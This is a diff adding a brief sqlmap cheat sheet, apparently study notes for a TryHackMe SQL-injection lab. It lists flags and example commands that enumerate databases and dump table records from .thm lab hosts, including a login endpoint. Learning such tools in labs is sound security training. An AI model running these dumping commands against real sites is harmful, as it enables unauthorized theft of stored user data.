@@ -1,0 +1,22 @@
+sqlmap --wizard
+sqlmap -u [TARGETURL] 
+
+_____
+FLAGS
+
+  -D        ((select database))
+  -T        ((select table))
+  -u        ((target URL))
+  -r        ((intercept POST request))
+
+  --dbs             ((extract database names))
+  --tables          ((extract table names))
+  --dump            ((enumerate records in table))
+  --level=[LEVEL]   ((set attack complexity level))
+
+________
+EXAMPLES
+
+sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
+sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
+sqlmap -u http://sqlmaptesting.thm/ai/includes/user_login?email=test&password=test --dbs --level=5
